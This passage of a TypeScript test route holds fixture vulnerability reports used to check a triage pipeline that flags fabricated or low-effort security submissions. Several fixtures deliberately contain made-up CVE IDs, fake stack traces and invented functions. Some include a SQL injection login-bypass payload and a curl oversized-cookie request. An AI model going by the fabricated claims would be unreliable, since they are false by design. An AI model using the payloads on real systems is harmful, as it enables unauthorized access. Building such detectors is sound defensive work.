    text: `# CVE-2024-3094 — XZ Utils Backdoor (independent discovery)

I have independently discovered a malicious code insertion in the upstream
XZ Utils package versions 5.6.0 and 5.6.1. The backdoor was introduced
through obfuscated build-time scripts and modifies the liblzma library
such that any software linked against it can be used to execute arbitrary
code under specific conditions.

The compromise affects sshd indirectly through libsystemd's dependency on
liblzma, allowing pre-authentication remote code execution on systems
where the malicious version was deployed.

Affected: xz-utils 5.6.0–5.6.1
Repository: https://github.com/tukaani-project/xz`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 55],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T4-04-fake-asan-round-addrs",
    tier: "T4_HALLUCINATED",
    text: `# Heap-buffer-overflow in libfoo's parse_packet (CVE-2025-99999)

\`\`\`
==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x600000000000
READ of size 4 at 0x700000000000 thread T0
    #0 0x100000000000 in parse_packet libfoo.c:200
    #1 0x100000000000 in parse_packet libfoo.c:200
    #2 0x100000000000 in parse_packet libfoo.c:200
    #3 0x100000000000 in handle_request server.c:500
\`\`\`

The crash is fully reproducible with the supplied poc.py exploit
script. Affects libfoo 2.0.0 through 2.4.7.

Note: addresses look round because libfoo allocates page-aligned slabs.
No SUMMARY: AddressSanitizer line because the process was killed by
the kernel before ASan could finish writing.`,
    expectedComposite: [0, 60],
    expectedEngine2: [0, 65],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T4-05-fake-cwe-mismatch",
    tier: "T4_HALLUCINATED",
    text: `# SQL Injection in /api/auth/login (CWE-79)
**Severity: Critical (CVSS 9.8)**

The /api/auth/login endpoint is vulnerable to SQL injection via the
\`username\` parameter, classified as CWE-79 Cross-Site Scripting.

Proof of concept:
\`\`\`
POST /api/auth/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=anything
\`\`\`

This bypasses authentication entirely and dumps the user table. The bug
exists in the function \`authenticateUser()\` of \`AuthController.java\`,
specifically the \`validateCredentials()\` helper which uses
\`PreparedStatement.executeUpdate()\` improperly.

Reference: github.com/example-org/totally-fake-repo-that-does-not-exist`,
    claimedCwes: ["CWE-79"],
    expectedComposite: [0, 45],
    expectedEngine2: [0, 55],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T4-06-fake-stacktrace-repeat",
    tier: "T4_HALLUCINATED",
    text: `# Use-after-free in nginx mod_http_v3 (CVE-2026-00001)

Confirmed crash with the following stack trace from gdb:

\`\`\`
#0 0xdeadbeefdead in process_frame at v3_frame.c:100
#1 0xdeadbeefdead in process_frame at v3_frame.c:100
#2 0xdeadbeefdead in process_frame at v3_frame.c:100
#3 0xdeadbeefdead in process_frame at v3_frame.c:100
#4 0xdeadbeefdead in dispatch_request at v3_dispatch.c:42
#5 0xdeadbeefdead in main at nginx.c:1
\`\`\`

PID 11111 was killed after 2 ms. Patch attached as patch.diff.

Affected: nginx 1.27.x mod_http_v3 (HTTP/3 module). I do not have a
reproducer build script — testing was done internally on a closed
testbench.`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 55],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T4-07-fake-pid-fake-fn",
    tier: "T4_HALLUCINATED",
    text: `# Critical: heap corruption in lodash 4.17.21 _.merge

The function \`_.merge\` in lodash 4.17.21 contains a heap corruption bug
when called with cyclic objects, leading to remote code execution.

\`\`\`
==99999==ERROR: AddressSanitizer: heap-use-after-free on address 0x10000000
WRITE of size 8 at 0x00400000 thread T0
\`\`\`

Internal helper \`_.zorgflux()\` is the root cause; it dereferences a
freed pointer when processing the second argument's prototype chain.

Working PoC available in exploit.py (not attached). Affects all versions
of lodash since 4.0.

CVSS: 10.0 (Critical)`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 55],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T4-08-fake-cve-id",
    tier: "T4_HALLUCINATED",
    text: `# CVE-2099-12345: Authentication bypass in express 4.18.2

I have discovered an authentication bypass affecting express 4.18.2
which I have responsibly disclosed as CVE-2099-12345.

The vulnerability lies in the session middleware where a crafted Cookie
header containing exactly 12345 bytes of base64 padding triggers an
integer overflow in \`session._parseSignedCookie\` and yields the next
session in memory belonging to another user.

PoC:
\`\`\`
curl -H "Cookie: connect.sid=$(python3 -c 'print("A"*12345)')" https://target/me
\`\`\`

I have not provided the patch script (attack.py) because release is
embargoed.`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 55],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T3-10-empty-shell",
    tier: "T3_SLOP",
    text: `# Important security finding

While reviewing the application I discovered a security issue that
should be addressed. The issue is related to how user input is handled
in the application. An attacker could potentially exploit this to gain
unauthorized access or cause other harm to the system.

I recommend that the development team review the input handling code
and apply best practices for input validation and output encoding. This
will help prevent a wide range of common web application vulnerabilities.

Severity: High`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
];

const FIXTURES: Fixture[] = [...T1, ...T2, ...T3, ...T4];

router.get("/test/run", async (_req, res) => {
  if (process.env.NODE_ENV === "production") {
    res.status(404).json({ error: "Not available in production." });
    return;
  }

  // v3.6.0 §10: exercise the *live* report pipeline (active verification +
  // 3-engine composite + matrix triage) rather than just the engine layer.
  // Mirrors the path taken by POST /api/reports — see routes/reports.ts.
  const results = await Promise.all(FIXTURES.map(async f => {
    const verification = await performActiveVerification(f.text);
    const traced = analyzeWithEnginesTraced(f.text, { claimedCwes: f.claimedCwes });
    const composite = traced.composite.overallScore;
    const e1 = traced.composite.engineResults.find(e => e.engine === "AI Authorship Detector")?.score ?? null;
    const e2Engine = traced.composite.engineResults.find(e => e.engine === "Technical Substance Analyzer");
    const e2 = e2Engine?.score ?? null;
    const e3 = traced.composite.engineResults.find(e => e.engine === "CWE Coherence Checker")?.score ?? null;

    const e2Strength =
      ((e2Engine?.signalBreakdown ?? {}) as { evidenceStrength?: { strongCount?: number } })
        .evidenceStrength?.strongCount ?? 0;

    // Build v36Context exactly as POST /api/reports does — only
    // referenced_in_report verification checks contribute to verificationRatio.
    const referencedChecks = (verification?.checks ?? []).filter(
      (c: { source?: string }) => c.source === "referenced_in_report",
    );
    const refVerified = referencedChecks.filter((c: { result: string }) => c.result === "verified").length;
    const refNotFound = referencedChecks.filter((c: { result: string }) => c.result === "not_found").length;
    const verificationRatio =
      (refVerified + refNotFound) > 0 ? refVerified / (refVerified + refNotFound) : 0;

    const slopScore = Math.max(0, 100 - composite);
    const triage = generateTriageRecommendation(
      slopScore,
      0.7,
      verification,
      [],
      {
        compositeScore: composite,
        engine2Score: e2 ?? 50,
        strongEvidenceCount: e2Strength,
        verificationRatio,
      },
    );

    const compositeOk = composite >= f.expectedComposite[0] && composite <= f.expectedComposite[1];
    const e2Ok = e2 != null && e2 >= f.expectedEngine2[0] && e2 <= f.expectedEngine2[1];
    const triageOk = f.expectedTriage.includes(triage.action as TriageAction);
    const passed = compositeOk && e2Ok && triageOk;

    return {
      id: f.id, tier: f.tier,
      composite, e1, e2, e3,
      triage: triage.action,
      verification: {
        referenced: referencedChecks.length,
        fallback: (verification?.checks ?? []).filter((c: { source?: string }) => c.source === "search_fallback").length,
        verified: refVerified,
        notFound: refNotFound,
        score: verification?.score ?? null,
      },
      expectedComposite: f.expectedComposite,
      expectedEngine2: f.expectedEngine2,
      expectedTriage: f.expectedTriage,
      compositeOk, e2Ok, triageOk, passed,
    };
  }));

  const tiers: Tier[] = ["T1_LEGIT", "T2_BORDERLINE", "T3_SLOP", "T4_HALLUCINATED"];
  const summary = tiers.map(tier => {
    const subset = results.filter(r => r.tier === tier);
    const composites = subset.map(r => r.composite);
    const e2s = subset.map(r => r.e2 ?? 0);
    const mean = composites.reduce((a, b) => a + b, 0) / Math.max(1, composites.length);
    const e2Mean = e2s.reduce((a, b) => a + b, 0) / Math.max(1, e2s.length);
    const min = Math.min(...composites);
    const max = Math.max(...composites);
    const passRate = subset.filter(r => r.passed).length / Math.max(1, subset.length);
    return {
      tier, count: subset.length,
      compositeMean: Number(mean.toFixed(1)),
      compositeMin: min, compositeMax: max,
      engine2Mean: Number(e2Mean.toFixed(1)),
      passRate: Number(passRate.toFixed(2)),
    };
  });

  // v3.6.0 success metric: T1 mean - T3 mean ≥ 25 AND every fixture passes.
  const t1Mean = summary.find(s => s.tier === "T1_LEGIT")?.compositeMean ?? 0;
  const t3Mean = summary.find(s => s.tier === "T3_SLOP")?.compositeMean ?? 0;
  const gap = Number((t1Mean - t3Mean).toFixed(1));
  const allFixturesPassed = results.every(r => r.passed);

  res.json({
    fixtureCount: FIXTURES.length,
    passed: allFixturesPassed && gap >= 25,
    results,
    summary,
    successMetrics: {
      legitMean: t1Mean,
      slopMean: t3Mean,
      gap,
      gapMeetsTarget: gap >= 25,
      allFixturesPassed,
      target: ">= 25pt gap between T1_LEGIT and T3_SLOP composite means; every fixture must pass its composite + Engine 2 + triage assertions",
    },
  });
});

export default router;
